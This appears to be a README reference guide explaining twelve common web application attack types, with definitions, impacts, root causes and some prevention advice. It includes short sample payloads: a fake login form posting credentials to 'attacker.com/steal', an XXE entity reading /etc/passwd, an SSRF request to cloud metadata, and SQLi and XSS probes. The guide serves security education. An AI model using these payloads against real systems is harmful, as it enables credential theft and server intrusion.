# Web Application Attack Types

> A reference guide covering common web application vulnerabilities and attack techniques — built to demonstrate understanding of offensive security concepts.

---

## Table of Contents

- [Open Redirect Vulnerabilities](#-open-redirect-vulnerabilities)
- [HTTP Parameter Pollution (HPP)](#-http-parameter-pollution-hpp)
- [Cross-Site Request Forgery (CSRF)](#-cross-site-request-forgery-csrf)
- [HTML Injection](#-html-injection)
- [Cross-Site Scripting (XSS)](#-cross-site-scripting-xss)
- [Template Injection (SSTI)](#-template-injection-ssti)
- [SQL Injection (SQLi)](#-sql-injection-sqli)
- [Server Side Request Forgery (SSRF)](#-server-side-request-forgery-ssrf)
- [Remote Code Execution (RCE)](#-remote-code-execution-rce)
- [Sub Domain Takeover](#-sub-domain-takeover)
- [Insecure Direct Object References (IDOR)](#-insecure-direct-object-references-idor)
- [XML External Entity (XXE)](#-xml-external-entity-xxe)
- [Quick Reference Table](#-quick-reference-table)

---

## Open Redirect Vulnerabilities

### What is it?
An open redirect occurs when an application takes a parameter and **redirects a user to that parameter value without any validation**.

### How it's exploited
- Used in **phishing attacks** to send users to malicious sites
- Abuses the trust of a legitimate domain to silently redirect users
- The malicious destination site is often designed to **look like the real site** and collect sensitive information

### Example Flow
```
User clicks → https://trusted-site.com/redirect?url=https://evil-site.com
                        ↓
         No validation on the URL parameter
                        ↓
         User lands on evil-site.com (looks legit)
                        ↓
         Credentials / personal data stolen
```

---

## HTTP Parameter Pollution (HPP)

### What is it?
HPP occurs when a website **accepts user input and uses it to make an HTTP request to another system** without validating that input.

### Two Types

| Type | Description |
|------|-------------|
| **Server-Side HPP** | Malicious input is used in back-end HTTP requests |
| **Client-Side HPP** | Malicious input manipulates client-side behavior |

### Root Cause
- Missing or insufficient **input validation**
- Unsanitized user input passed directly into HTTP requests

---

## Cross-Site Request Forgery (CSRF)

### What is it?
A CSRF attack occurs when a **malicious website causes a user's browser to perform an action on another website where the user is already authenticated** — often without the user knowing.

### Real-World Example

```
Step 1: Bob logs into his bank → session cookie stored in browser
Step 2: Bob visits a malicious website (via email link, etc.)
Step 3: Malicious site sends a request to Bob's bank:
        POST https://bobs-bank.com/transfer
        Cookie: [Bob's session cookie]
        Amount: $5000 → Attacker's account
Step 4: Bank processes the request (no CSRF token check) 
Step 5: Bob loses $5000 
```

### Prevention
- Use **CSRF tokens** on all state-changing requests
- Implement **SameSite cookie attributes**
- Validate **HTTP Referer headers**

---

## HTML Injection

### What is it?
Also known as **virtual defacement** — occurs when a site allows a malicious user to inject **raw HTML into web pages** due to improper input handling.

> ️ This is distinct from JavaScript injection (XSS) — HTML injection injects structural markup, not scripts.

### What an attacker can do
- Change the **look and layout** of a web page
- Inject fake **`<form>` elements** to trick users into submitting credentials
- The fake form sends data to the **attacker's server**, not the legitimate site

### Example
```html
<!-- Attacker injects this via a vulnerable input field -->
<form action="https://attacker.com/steal" method="POST">
  <p>Session expired. Please log in again.</p>
  Username: <input name="user">
  Password: <input name="pass" type="password">
  <button>Login</button>
</form>
```

---

## Cross-Site Scripting (XSS)

### What is it?
XSS involves a website **including unintended JavaScript code** which is then executed by users via their browsers.

### Types of XSS

| Type | Persisted? | Description |
|------|-----------|-------------|
| **Reflected XSS** |  No | Delivered and executed via a single request/response cycle |
| **Stored XSS** |  Yes | Saved on the server, executed when unsuspecting users load the page |
| **Self XSS** |  No | Tricks the user into running the malicious script themselves |

### Basic Example
```javascript
// Attacker injects this into a vulnerable input field
<script>alert(document.domain)</script>

// Result: popup showing the domain — confirms XSS vulnerability
```

### Impact
- Session hijacking
- Credential theft
- Malware distribution
- Page defacement

---

## Template Injection (SSTI)

### What is it?
**Server Side Template Injection (SSTI)** occurs when template engines render user input **without properly sanitizing it**.

### Background
Template engines separate programming logic from data presentation in dynamic web apps. When user input is passed directly into a template without sanitization, attackers can inject template syntax to execute server-side code.

### Example Flow
```
Normal:   https://site.com/page?name=John    → Hello, John
Injected: https://site.com/page?name={{7*7}} → Hello, 49  ← SSTI confirmed!
```

### Impact
- **Remote Code Execution** on the server
- Full server compromise in severe cases

---

## SQL Injection (SQLi)

### What is it?
SQLi allows an attacker to **inject SQL statements** into a target application to access or manipulate its database.

### What attackers can do (CRUD abuse)

| Action | SQL | Impact |
|--------|-----|--------|
| **Create** | `INSERT` | Add fake/malicious records |
| **Read** | `SELECT` | Dump sensitive data (passwords, PII) |
| **Update** | `UPDATE` | Modify existing records |
| **Delete** | `DELETE` | Destroy database records |

>  In severe cases, attackers may achieve **Remote Command Execution** on the server.

### Root Cause
Unescaped user input passed directly into database queries.

### Example
```sql
-- Normal query
SELECT * FROM users WHERE username = 'john' AND password = 'pass123';

-- Injected input: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
-- Returns ALL users → authentication bypassed 
```

---

## Server Side Request Forgery (SSRF)

### What is it?
SSRF allows an attacker to **use a vulnerable server to make HTTP requests on the attacker's behalf**.

### SSRF vs CSRF

| | SSRF | CSRF |
|-|------|------|
| **Victim** | The server | The user's browser |
| **Attacker controls** | Server-side requests | Browser-side requests |

### Potential Impact
- **Information Disclosure** — trick the server into revealing internal data (e.g., AWS EC2 metadata)
- **XSS** — get the server to render a remote HTML file containing JavaScript
- **Internal network scanning** — probe services behind firewalls

### Example
```
Attacker sends: https://vulnerable-site.com/fetch?url=http://169.254.169.254/latest/meta-data/
Server fetches AWS metadata and returns it to the attacker
```

---

## Remote Code Execution (RCE)

### What is it?
RCE refers to **injecting code that is interpreted and executed** by a vulnerable application.

>  RCE is sometimes used interchangeably with **Command Injection**.

### Root Cause
User-submitted input is used by the application **without sanitization or validation**, allowing code to be run on the target system.

### Impact
- Full server compromise
- Data exfiltration
- Backdoor installation
- Lateral movement within a network

---

## Sub Domain Takeover

### What is it?
A situation where a **malicious actor is able to claim a subdomain** belonging to a legitimate site.

### How it happens
```
legitimate-site.com sets up:   → subdomain.legitimate-site.com → points to third-party service
Third-party service is deleted  → DNS record still exists (dangling DNS)
Attacker claims the service     → Now controls subdomain.legitimate-site.com
```

### Impact
- Phishing using a trusted subdomain
- Cookie theft (if subdomain shares cookie scope)
- Reputation damage to the legitimate organization

---

## Insecure Direct Object References (IDOR)

### What is it?
An IDOR vulnerability occurs when an attacker can **access or modify a reference to an object** (file, database record, account, etc.) that should be inaccessible to them.

### Example
```
Legitimate request:
GET https://site.com/account?id=1001   → Shows YOUR account

Attacker changes the ID:
GET https://site.com/account?id=1002   → Shows SOMEONE ELSE'S account 
```

### Root Cause
- No **authorization check** verifying the user owns or has permission to access the object
- Predictable / sequential object IDs

---

## XML External Entity (XXE)

### What is it?
An XXE vulnerability involves **exploiting how an application parses XML input** — specifically, how it processes the inclusion of **external entities** in that input.

### Background
XML supports a feature called **external entities** — references to external resources (files, URLs) defined within the XML document itself. When an application parses XML without disabling this feature, attackers can abuse it to make the server load unintended resources.

### How it works
```xml
<!-- Normal XML -->
<user>
  <name>John</name>
</user>

<!-- XXE Payload — attacker defines an external entity -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>   <!-- Server reads /etc/passwd and returns its contents -->
</user>
```

### Attack Flow
```
Attacker crafts malicious XML with external entity
              ↓
Sends it to a vulnerable application endpoint
              ↓
XML parser processes the external entity reference
              ↓
Server fetches the file/URL defined in the entity
              ↓
Contents returned in the response to the attacker 
```

### Potential Impact
- **File disclosure** — read sensitive server files (e.g., `/etc/passwd`, config files)
- **SSRF** — force the server to make requests to internal services
- **Denial of Service** — via recursive entity expansion (Billion Laughs attack)
- **Remote Code Execution** — in some configurations

### Root Cause
- XML parser configured to **allow external entity processing**
- No input validation or sanitization on XML input

### Prevention
- Disable external entity processing in the XML parser
- Use less complex data formats like **JSON** where possible
- Validate and sanitize all XML input

---

## Quick Reference Table

| Attack | Category | Impact | Root Cause |
|--------|----------|--------|------------|
| **Open Redirect** | Input Validation | Phishing, credential theft | No URL validation |
| **HPP** | Input Validation | Request manipulation | No input sanitization |
| **CSRF** | Session | Unauthorized actions | No CSRF token |
| **HTML Injection** | Injection | Page defacement, credential theft | Unescaped HTML input |
| **XSS** | Injection | Session hijack, malware | Unescaped JS input |
| **SSTI** | Injection | RCE, server compromise | Unsanitized template input |
| **SQLi** | Injection | Data breach, RCE | Unescaped SQL input |
| **SSRF** | Request Forgery | Info disclosure, internal recon | Unvalidated server requests |
| **RCE** | Injection | Full server compromise | No input validation |
| **Subdomain Takeover** | DNS | Phishing, cookie theft | Dangling DNS records |
| **IDOR** | Access Control | Unauthorized data access | Missing authorization checks |
| **XXE** | Injection | File disclosure, SSRF, RCE | Unsafe XML parser configuration |

---

## Contributing

Found an error or want to add more attacks? Contributions are welcome!  
Please open an **issue** or submit a **pull request**.

---
